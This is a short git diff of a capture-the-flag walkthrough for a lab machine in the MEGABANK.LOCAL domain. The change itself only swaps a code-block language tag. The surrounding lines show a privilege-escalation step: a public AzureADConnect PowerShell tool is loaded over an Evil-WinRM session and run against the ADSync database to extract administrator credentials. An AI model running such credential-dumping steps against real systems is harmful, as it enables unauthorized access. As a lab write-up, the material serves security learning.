@@ -156,7 +156,7 @@ NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10        
 ```
 `MEGABANK\Azure Admins` seems to be usefull somehow, after a google search we find a priv esc tool called `AzureADConnect` which spits out the admin creds for the box, so we try and utilise this. https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1 <-- for the tool 
 
-```bash
+```python
 *Evil-WinRM* PS C:\Users\mhope\Desktop> import module ./AzureADConnect.ps1 <-- from our box
 *Evil-WinRM* PS C:\Users\mhope\Desktop> AzureADConnect -server 127.0.0.1 -db ADSync
 [+] Domain:  MEGABANK.LOCAL
